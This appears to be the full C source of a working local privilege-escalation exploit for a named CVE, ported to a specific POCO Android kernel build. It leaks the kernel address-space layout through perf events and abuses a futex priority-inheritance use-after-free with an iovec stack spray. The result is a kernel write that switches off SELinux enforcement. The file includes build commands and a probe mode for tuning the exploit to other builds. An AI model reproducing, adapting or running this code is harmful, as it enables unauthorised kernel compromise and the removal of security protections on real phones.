//
// poc_air.c — CVE-2026-43499 (GhostLock) port to POCO air 5.15.180 GKI
//
// Adapted from the a54x working poc.c (zainarbani / telegram author, confirmed
// write-0 to selinux_state->enforcing on 5.15.189). The ONLY changes from the
// a54x original:
//   1) KASLR: tracefs sched_blocked_reason leak replaced by the perf-event
//      text-base leak (perf_event_paranoid allows it on POCO; validated).
//   2) ksym_offs[] = POCO 5.15.180 link-time offsets (relative to _text).
//   3) PROBE mode (env PROBE=1): spray valid user-address sentinels
//      (0xabcdef00|i<<8) in all waiter fields except lock=fake_lock.
//      Full two-phase run; panic fault address or enforce=0 confirms
//      which iov slot maps to waiter fields (especially parent_color).
//
// Build (NDK r29):
//   /mnt/Data/AI_Workspace/android-ndk-r29/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
//     -O2 -static -pthread poc_air.c -o poc_air
//
// Run (device, uid 2000 shell): ./poc_air   (PROBE=1 ./poc_air to map fields;
//   IOV_IDX=d ./poc_air to spray precisely at displacement d learned from PROBE)
//
// PRIMITIVE (adapted from a54x; fake_lock = ZEROED BSS rt_mutex at uid_lock+0x200,
//   NOT inet6_protos+0x90 which is RO, and NOT the uid_lock spinlock itself which
//   is garbage when read as an rt_mutex):
//   sendmmsg iovec spray overwrites Y's dangling rt_mutex_waiter on its own
//   kernel stack (CVE-2026-43499 UAF left by the PI-cycle EDEADLK). waiter.task
//   -> init_task, waiter.lock -> ZEROED fake rt_mutex (owner==0, wait_lock==0,
//   empty tree) so the walk exits cleanly. PHASE1 settles the ghost. PHASE2 re-sprays
//   tree_entry.__rb_parent_color=selinux_state-8 with children=0, lock=fresh
//   uid_lock+0x300 (distinct zeroed BSS rt_mutex), re-trigger -> rb_erase NULL-writes
//   selinux_state->enforcing (= +0).

#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdatomic.h>
#include <linux/futex.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/resource.h>
#include <poll.h>
#include <time.h>
#include <stdarg.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <linux/perf_event.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif

#define FUTEX_LOCK_PI             6
#define FUTEX_UNLOCK_PI           7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG      128
#define FUTEX_LOCK_PI_PRIVATE         (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUTEX_WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FUTEX_CMP_REQUEUE_PI_PRIVATE  (FUTEX_CMP_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)

#define __NR_futex_aarch64  98
#define __NR_sched_setscheduler 119

/* ── POCO air 5.15.180 GKI ─────────────────────────────────────────────────── */
#define KIMAGE_TEXT_BASE     0xffffffc008000000ULL
#define PERF_LEAK_ALIGN       0x200000ULL

/* Link-time offsets (nm of kernel_5-15-180-vmlinux.elf, _text=0xffffffc008000000).
 * Runtime VA = KIMAGE_TEXT_BASE + slide + off. */
struct ksym_off { const char *name; uint64_t off; };
static const struct ksym_off ksym_offs[] = {
    { "empty_zero_page",  0xad53000ULL },
    { "init_cred",        0xabfd698ULL },
    { "init_task",        0xac43640ULL },
    { "modprobe_path",    0xab24120ULL },
    { "selinux_state",    0xada9d78ULL },   /* enforcing @ +0 */
    { "panic_timeout",    0xab20680ULL },
    { "inet6_protos",     0xab0b3f8ULL },   /* RO on this build — do NOT use as fake_lock */
    { "uid_lock",         0xadca680ULL },   /* writable BSS spinlock; anchor for ZEROED fake_lock at +0x200/+0x300 */
    { "memstart_addr",    0xa164a50ULL },
    { "kimage_voffset",   0xa164a58ULL },
};

static uint64_t kaslr_base  = KIMAGE_TEXT_BASE;
static uint64_t kaslr_slide = 0;

static uint64_t kaddr_of(const char *name) {
    for (size_t i = 0; i < sizeof(ksym_offs)/sizeof(ksym_offs[0]); i++)
        if (strcmp(name, ksym_offs[i].name) == 0)
            return kaslr_base + ksym_offs[i].off;
    return 0;
}
static unsigned long resolve(const char *name) { return (unsigned long)kaddr_of(name); }

/* ── perf KASLR leak (ported from exploit-pselect/src/util.c:783) ───────────── */
static uint64_t perf_leak_text_base(void) {
    int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
    if (pfd >= 0) {
        char pbuf[16]; ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1); close(pfd);
        if (pn > 0) { pbuf[pn] = 0; if (atoi(pbuf) > 1) { fprintf(stderr,"[kaslr] perf_event_paranoid too high\n"); return 0; } }
    }
    struct perf_event_attr pe; memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE; pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.size = sizeof(pe); pe.sample_period = 1; pe.sample_type = PERF_SAMPLE_IP;
    pe.exclude_user = 1; pe.exclude_hv = 1; pe.disabled = 1; pe.wakeup_events = 1;
    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { pe.sample_period = 100000; fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0); }
    if (fd < 0) { fprintf(stderr,"[kaslr] perf_event_open errno=%d\n", errno); return 0; }
    size_t pgsz = (size_t)sysconf(_SC_PAGESIZE);
    size_t mmap_size = (size_t)(1 + 8) * pgsz;
    void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmap_buf == MAP_FAILED) { fprintf(stderr,"[kaslr] mmap errno=%d\n", errno); close(fd); return 0; }
    struct perf_event_mmap_page *header = (struct perf_event_mmap_page *)mmap_buf;
    uint64_t min_kip = ~(uint64_t)0; int kernel_samples = 0;
    ioctl(fd, PERF_EVENT_IOC_RESET, 0); ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (volatile long i = 0; i < 500000; i++) { if ((i % 10000) == 0) sched_yield(); }
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    uint64_t data_tail = header->data_tail, data_head = header->data_head; __sync_synchronize();
    uint64_t data_size = 8 * (uint64_t)pgsz;
    uint8_t *base = (uint8_t *)mmap_buf + pgsz;
    while (data_tail < data_head) {
        struct perf_event_header *ev = (struct perf_event_header *)(base + (data_tail % data_size));
        if (ev->size == 0 || data_tail + ev->size > data_head) break;
        if (ev->type == PERF_RECORD_SAMPLE && (ev->misc & PERF_RECORD_MISC_KERNEL)) {
            uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
            if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) min_kip = ip;
            kernel_samples++;
        }
        data_tail += ev->size;
    }
    header->data_tail = data_tail; munmap(mmap_buf, mmap_size); close(fd);
    if (kernel_samples == 0 || min_kip == ~(uint64_t)0) { fprintf(stderr,"[kaslr] no kernel samples\n"); return 0; }
    uint64_t text_base = (min_kip & ~(PERF_LEAK_ALIGN - 1));
    if (text_base < KIMAGE_TEXT_BASE) { fprintf(stderr,"[kaslr] out of range %016llx\n", (unsigned long long)text_base); return 0; }
    fprintf(stderr,"[kaslr] perf text-base=%016llx min_kip=%016llx samples=%d\n",
            (unsigned long long)text_base, (unsigned long long)min_kip, kernel_samples);
    return text_base;
}

/* ── futex / syscalls ──────────────────────────────────────────────────────── */
static int pi1 = 0, pi2 = 0, cond = 0;
static atomic_int y_locked_l2 = 0, x_locked_l1 = 0, y_parking = 0, x_blocking = 0;
static _Atomic int y_done = 0;
static atomic_int respray_done = 0;
static atomic_int respray_ready = 0;
static unsigned long respray_parent_color = 0;
static atomic_int y_tid = 0, x_tid = 0, z_tid = 0;

long syscall(long, ...);
static long futex_svc(volatile int *uaddr1, long op, long val, long val2, volatile int *uaddr2, long val3) {
    register long x0 __asm__("x0") = (long)uaddr1;
    register long x1 __asm__("x1") = op;
    register long x2 __asm__("x2") = val;
    register long x3 __asm__("x3") = val2;
    register long x4 __asm__("x4") = (long)uaddr2;
    register long x5 __asm__("x5") = val3;
    register long x8 __asm__("x8") = __NR_futex_aarch64;
    __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8) : "memory","cc");
    return x0;
}
static long sysc4(long n, long a, long b, long c, long d) {
    register long x8 __asm__("x8") = n; register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0" : "+r"(x0) : "r"(x8),"r"(x1),"r"(x2),"r"(x3) : "memory");
    return x0;
}

/* Spray the iovec array into the kernel on-stack iovstack via the chosen syscall.
 * sendmsg (sendmmsg): sock_sendmsg path. writev: do_iter_write path (different
 * kernel frame depth -> different displacement K relative to the freed waiter).
 * Both copy iovecs to iovstack[8] for iovcnt<=8; for bad base/len they return
 * EFAULT after the copy, so the stack is still contaminated for the pivot. */
static int g_iov_idx = 1;                          /* PHASE1+PHASE2 displacement (set via IOV_IDX / PROBE). d=1 = reference a54x (waiter at iov[1], task/lock at iov[4]). */
static const char *g_spray_method = "sendmsg";     /* spray syscall: "sendmsg" (sendmmsg) or "writev" (do_iter_write) */
static void do_spray(int fd, struct iovec *iov) {
    if (strcmp(g_spray_method, "writev") == 0) {
        (void)syscall(SYS_writev, (long)fd, (long)iov, 8L);
    } else {
        struct mmsghdr { struct msghdr msg_hdr; unsigned int msg_len; } mv;
        memset(&mv, 0, sizeof mv);
        mv.msg_hdr.msg_iov = iov; mv.msg_hdr.msg_iovlen = 8;
        (void)syscall(SYS_sendmmsg, (long)fd, (long)&mv, 1L, 0L);
    }
}

/* ── resolved symbols ──────────────────────────────────────────────────────── */
static unsigned long kaddr_init_cred, kaddr_init_task, kaddr_modprobe, kaddr_selinux, kaddr_panic;
static unsigned long kaddr_empty_zero_page;
static unsigned long fake_lock_addr, fake_lock2_addr;
static unsigned long k_safe_write_value;

static int y_sched_policy = SCHED_NORMAL;
static long trigger_adj_pi(pid_t tid) {
    struct sched_param sp = { .sched_priority = 0 };
    int pol = (y_sched_policy == SCHED_NORMAL) ? SCHED_BATCH : SCHED_NORMAL;
    long r = sysc4(__NR_sched_setscheduler, (long)tid, (long)pol, (long)&sp, 0);
    y_sched_policy = pol;
    return r;
}

static const char *enforce_path = "/sys/fs/selinux/enforce";
static long read_enforce(void) {
    FILE *pf = fopen(enforce_path, "r"); long v = -2;
    if (pf) { if (fscanf(pf, "%ld", &v) != 1) v = -999; fclose(pf); }
    return v;
}

/* ── iov index: which iov[k] carries (task=iov_base, lock=iov_len) ──────────── */
/* Kernel-build-specific. Default 1 (a54x 5.15.189 / poc.c reference).
 * Override at runtime with IOV_IDX=k after learning it via PROBE mode. */

/* ── PROBE spray: per-index sentinels ──────────────────────────────────────── */
/* Matches el02.c / poc-ref pattern: magic high bits + iov index.
 * The panic fault address preserves the full sentinel so we can extract
 * the iov index and infer the waiter field from the reference mapping. */
#define SENT_BASE 0xabcdef0000000000ULL
#define SENT(i) ((void *)(SENT_BASE | ((uint64_t)(i) << 8)))

/* ── Z: FUTEX_LOCK_PI(L2) walks into the ghost ─────────────────────────────── */
static void *thread_Z(void *arg) {
    (void)arg; atomic_store(&z_tid, syscall(SYS_gettid));
    fprintf(stderr,"[Z] tid=%d\n", z_tid);
    while (!atomic_load(&y_done)) ;
    fprintf(stderr,"[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on\n");
    long r = futex_svc(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    fprintf(stderr,"[Z] LOCK_PI(L2) returned %ld (UNEXPECTED if pivot worked)\n", r);
    while (1) ;
    return NULL;
}

/* ── Y: owns L2, parks on cond->L1, then sprays its own dangling waiter ─────── */
static void *thread_Y(void *arg) {
    (void)arg; atomic_store(&y_tid, syscall(SYS_gettid));
    fprintf(stderr,"[Y] tid=%d\n", y_tid);
    long r = futex_svc(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { fprintf(stderr,"[Y] LOCK_PI(L2) failed: %s\n", strerror((int)-r)); return NULL; }
    atomic_store(&y_locked_l2, 1);
    while (!atomic_load(&x_locked_l1)) sched_yield();
    atomic_store(&y_parking, 1);
    r = futex_svc(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

    int sv[2] = { -1, -1 };
    syscall(SYS_socketpair, 1L, 2L, 0L, (long)sv);

    /* iovlen MUST be <= 8: ___sys_sendmsg copies iovecs on-stack (iovstack[8])
     * only when iovlen<=UIO_FASTIOV; larger counts kmalloc to the HEAP and
     * never overlap a kernel-stack waiter. randomize_kstack_offset is OFF on
     * this device, so the displacement is deterministic. Reference a54x layout
     * (poc-ref/poc.c): displacement d=1 — waiter+0x00 at iov[1]. */
    static struct iovec iov[8];
    int probe = (getenv("PROBE") != NULL);
    int li = (strcmp(g_spray_method, "writev") == 0) ? 0 : 4;

    if (probe) {
        fprintf(stderr,"[Y] PROBE spray: sentinels in all fields except lock=fake_lock (valid, allows walk to continue)\n");
        for (int i = 0; i < 8; i++) {
            iov[i].iov_base = SENT(i);
            iov[i].iov_len  = (unsigned long)SENT(i);
        }
        iov[li].iov_base = (void *)kaddr_init_task;     /* task = init_task (valid deref) */
        iov[li].iov_len  = (unsigned long)fake_lock_addr; /* lock = fake_lock (valid, walk continues to tree_entry) */
    } else {
         int d = g_iov_idx;
         fprintf(stderr,"[Y] PHASE1 spray: settle ghost (d=%d method=%s: li=%d parent@iov0..%d)\n",
                 d, g_spray_method, li, d+2);
         for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)0x0UL; iov[i].iov_len = 0UL; }
         iov[li].iov_base = (void *)kaddr_init_task;
         iov[li].iov_len  = (unsigned long)fake_lock_addr;
    }

    struct mmsghdr { struct msghdr msg_hdr; unsigned int msg_len; };
    static struct mmsghdr mv; memset(&mv, 0, sizeof mv);
    mv.msg_hdr.msg_iov = iov; mv.msg_hdr.msg_iovlen = 8;
    fprintf(stderr, "[Y] SPRAY-DEBUG iovstack base=%p  &iov[4]=%p  method=%s\n",
            (void *)iov, (void *)&iov[4], g_spray_method);
    do_spray(sv[0], iov);   /* last syscall in Y (PHASE1) */

    atomic_store_explicit(&y_done, 1, memory_order_release);

      /* PHASE 2 (write): re-spray the poisoned waiter precisely at displacement
       * d=g_iov_idx: __rb_parent_color = selinux-8, rb_right = k_safe_write_value
       * (empty_zero_page: low byte 0x00 -> enforcing=0, byte2 0x53 -> initialized=1),
       * rb_left = 0, lock = fake_lock2 (fresh zeroed BSS rt_mutex @ uid_lock+0x300).
       * rb_erase sees ghost has a child (rb_right != NULL), so child = k_safe_write_value.
       * parent->rb_right = child writes the safe value to selinux_state->enforcing (+0).
       * This keeps selinux initialized=1 and avoids corrupting adjacent fields. */
       while (!respray_ready) sched_yield();
       respray_ready = 0;
       {
            int d = g_iov_idx;
           fprintf(stderr,"[Y] PHASE2 spray: d=%d li=%d parent=selinux-8 rb_right=safe(empty_zero_page) rb_left=0 lock=fake_lock2\n", d, li);
           for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)0x0UL; iov[i].iov_len = 0UL; }
           iov[d].iov_base   = (void *)(kaddr_selinux - 8);    /* __rb_parent_color = selinux-8 (waiter+0x00) */
           iov[d].iov_len    = (unsigned long)k_safe_write_value; /* rb_right = safe value -> rb_erase writes it to selinux enforcing */
           if (d + 1 < 8) iov[d+1].iov_base = (void *)0x0UL;   /* rb_left = 0 */
           iov[li].iov_base = (void *)kaddr_init_task;        /* waiter->task */
           iov[li].iov_len  = (unsigned long)fake_lock2_addr; /* waiter->lock = ZEROED fake_lock2 */
           do_spray(sv[0], iov);
     }
    atomic_store_explicit(&respray_done, 1, memory_order_release);

    while (1) { sched_yield(); }
    return NULL;
}

/* ── X: owns L1, blocks on L2 (held by Y) ──────────────────────────────────── */
static void *thread_X(void *arg) {
    (void)arg; atomic_store(&x_tid, syscall(SYS_gettid));
    fprintf(stderr,"[X] tid=%d\n", x_tid);
    while (!atomic_load(&y_locked_l2)) sched_yield();
    long r = futex_svc(&pi1, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { fprintf(stderr,"[X] LOCK_PI(L1) failed: %s\n", strerror((int)-r)); return NULL; }
    atomic_store(&x_locked_l1, 1);
    atomic_store(&x_blocking, 1);
    r = futex_svc(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);   /* blocks (cycle) */
    fprintf(stderr,"[X] LOCK_PI(L2) returned %ld\n", r);
    return NULL;
}

static void do_2(void) {
    pthread_t tz; pthread_create(&tz, NULL, thread_Z, NULL);
    usleep(500000);
    fprintf(stderr,"[do_2] Z blocked on L2 — chain walk survived\n");

    if (getenv("PROBE")) {
        int d = g_iov_idx;
        int li = (strcmp(g_spray_method, "writev") == 0) ? 0 : 4;
        fprintf(stderr,"[do_2] PROBE: full two-phase (settle + write) with sentinels\n");
        fprintf(stderr,"[do_2] PHASE1: settle ghost (lock=fake_lock@iov[%d], other fields=sentinels)\n", li);
        int ret = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
        if (ret < 0) { fprintf(stderr,"[phase1] sched_setscheduler failed: %s\n", strerror((int)-ret)); return; }
        usleep(100000);
        fprintf(stderr,"[phase1] chain walk OK (kernel alive) — if no panic, lock mapping is iov[%d]\n", li);

        fprintf(stderr,"[phase2] re-spray parent=selinux-8@iov[%d] lock=fake_lock2@iov[%d], other fields=sentinels\n", d, li);
        respray_parent_color = kaddr_selinux - 8;
        atomic_store_explicit(&respray_ready, 1, memory_order_release);
        while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();

        int ret2 = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
        if (ret2 < 0) { fprintf(stderr,"[phase2] sched_setscheduler failed: %s\n", strerror((int)-ret2)); return; }
        usleep(100000);
        fprintf(stderr,"[phase2] chain walk done\n");

        long after = read_enforce();
        fprintf(stderr,"[phase2] /sys/fs/selinux/enforce AFTER = %ld\n", after);
        if (after == 0) {
            fprintf(stderr,"[rw] PROBE SUCCESS: write primitive confirmed (enforcing 1 -> 0)\n");
            fprintf(stderr,"[rw] mapping: iov[%d] = task/lock, iov[%d] = parent_color (selinux-8)\n", li, d);
        } else {
            fprintf(stderr,"[rw] PROBE: write did NOT land (enforce still %ld) — check panic for sentinel 0xabcdef00XX\n", after);
        }

        while (1) sched_yield();
    }

    fprintf(stderr,"[phase1] sched_setscheduler(Y) -> rb_erase NULL write to root (settle)\n");
    int ret = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
    if (ret < 0) { fprintf(stderr,"[phase1] sched_setscheduler failed: %s\n", strerror((int)-ret)); return; }
    usleep(100000);
    fprintf(stderr,"[phase1] chain walk OK (kernel alive)\n");

    /* PHASE 2: re-spray poisoned waiter, then trigger -> rb_erase NULL-writes selinux */
    fprintf(stderr,"[phase2] request re-spray (parent=selinux-8, lock=fake_lock2 @ uid_lock+0x300)\n");
    respray_parent_color = kaddr_selinux - 8;
    atomic_store_explicit(&respray_ready, 1, memory_order_release);
    while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
    fprintf(stderr,"[phase2] sched_setscheduler(Y) -> rb_erase NULL write to selinux\n");
    int ret2 = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
    if (ret2 < 0) { fprintf(stderr,"[phase2] sched_setscheduler failed: %s\n", strerror((int)-ret2)); return; }
    usleep(100000);
    fprintf(stderr,"[phase2] chain walk done\n");

    long after = read_enforce();
    fprintf(stderr,"[phase2] /sys/fs/selinux/enforce AFTER = %ld\n", after);
    if (after == 0) fprintf(stderr,"[rw] WRITE PRIMITIVE CONFIRMED: enforcing 1 -> 0\n");
    else fprintf(stderr,"[rw] write did NOT land (enforce still %ld) — ensure IOV_IDX=d from PROBE\n", after);

    fprintf(stderr,"\n[do_2] === SUMMARY ===\n");
    fprintf(stderr,"  fake_lock   = 0x%lx (uid_lock+0x200, ZEROED BSS rt_mutex)\n", fake_lock_addr);
    fprintf(stderr,"  fake_lock2  = 0x%lx (uid_lock+0x300, ZEROED BSS rt_mutex)\n", fake_lock2_addr);
    fprintf(stderr,"  init_task   = 0x%lx\n", kaddr_init_task);
    fprintf(stderr,"  selinux_state = 0x%lx\n", kaddr_selinux);
    fprintf(stderr,"  init_cred   = 0x%lx\n", kaddr_init_cred);
    fprintf(stderr,"  modprobe_path = 0x%lx\n", kaddr_modprobe);
}

static void sigusr1_handler(int sig) { (void)sig; }

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);
    pid_t tgid = getpid();
    signal(SIGUSR1, sigusr1_handler);

    const char *idx = getenv("IOV_IDX");
    if (idx) { int v = atoi(idx); if (v >= 0 && v < 8) g_iov_idx = v; }
    const char *spray = getenv("SPRAY");
    if (spray && (strcmp(spray, "writev") == 0 || strcmp(spray, "sendmsg") == 0))
        g_spray_method = spray;
    fprintf(stderr,"[main] g_iov_idx=%d (override with IOV_IDX=k)  spray=%s\n", g_iov_idx, g_spray_method);

    kaslr_base = perf_leak_text_base();
    if (!kaslr_base) { fprintf(stderr,"[kaslr] FATAL: perf leak failed\n"); return EXIT_FAILURE; }
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    fprintf(stderr,"[kaslr] base=0x%lx slide=0x%lx\n", kaslr_base, kaslr_slide);

    kaddr_init_cred = resolve("init_cred");
    kaddr_init_task = resolve("init_task");
    kaddr_modprobe  = resolve("modprobe_path");
    kaddr_selinux   = resolve("selinux_state");
    kaddr_panic     = resolve("panic_timeout");
    kaddr_empty_zero_page = resolve("empty_zero_page");
    fake_lock_addr  = resolve("uid_lock") + 0x200;    /* ZEROED BSS rt_mutex (was inet6_protos+0x90 RO).
                                                           uid_lock is a spinlock, NOT an rt_mutex;
                                                           adjust_prio_chain needs owner==0/wait_lock==0/empty tree. */
    fake_lock2_addr = resolve("uid_lock") + 0x300;    /* distinct ZEROED BSS rt_mutex for the write walk */
    k_safe_write_value = kaddr_empty_zero_page;       /* low byte 0x00 -> enforcing=0; byte2 nonzero -> initialized stays 1 */
    fprintf(stderr,"  init_task   = 0x%lx\n", kaddr_init_task);
    fprintf(stderr,"  selinux_state = 0x%lx (enforcing @ +0)\n", kaddr_selinux);
    fprintf(stderr,"  fake_lock   = 0x%lx (uid_lock+0x200, ZEROED BSS rt_mutex)\n", fake_lock_addr);
    fprintf(stderr,"  fake_lock2  = 0x%lx (uid_lock+0x300, ZEROED BSS rt_mutex)\n", fake_lock2_addr);
    fprintf(stderr,"  safe_write  = 0x%lx (empty_zero_page: low byte 0x00, byte2 0x53)\n", k_safe_write_value);
    if (!kaddr_init_task || !fake_lock_addr || !kaddr_selinux) {
        fprintf(stderr,"[main] FATAL: unresolved symbols\n"); return EXIT_FAILURE;
    }

    pthread_t tx, ty;
    pthread_create(&ty, NULL, thread_Y, NULL);
    while (!atomic_load(&y_locked_l2)) sched_yield();
    pthread_create(&tx, NULL, thread_X, NULL);

    while (!(atomic_load(&y_locked_l2) && atomic_load(&x_locked_l1) &&
             atomic_load(&y_parking) && atomic_load(&x_blocking))) sched_yield();
    usleep(200000);

    fprintf(stderr,"[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle\n");
    long r = futex_svc(&cond, FUTEX_CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
    cond = 1; __atomic_thread_fence(__ATOMIC_SEQ_CST);
    tgkill(tgid, atomic_load_explicit(&y_tid, memory_order_acquire), SIGUSR1);

    fprintf(stderr,"[main] CMP_REQUEUE_PI returned %ld", r);
    if (r >= 0) { fprintf(stderr," (no deadlock — cycle NOT detected)\n"); return EXIT_FAILURE; }
    fprintf(stderr," (%s)\n", strerror((int)-r));
    if (-r != EDEADLK && -r != EDEADLOCK) { fprintf(stderr,"[main] not EDEADLK\n"); return EXIT_FAILURE; }
    fprintf(stderr,"[main] -EDEADLK: full chainwalk caught PI cycle\n");

    while (!atomic_load_explicit(&y_done, memory_order_acquire));
    do_2();
    return EXIT_SUCCESS;
}
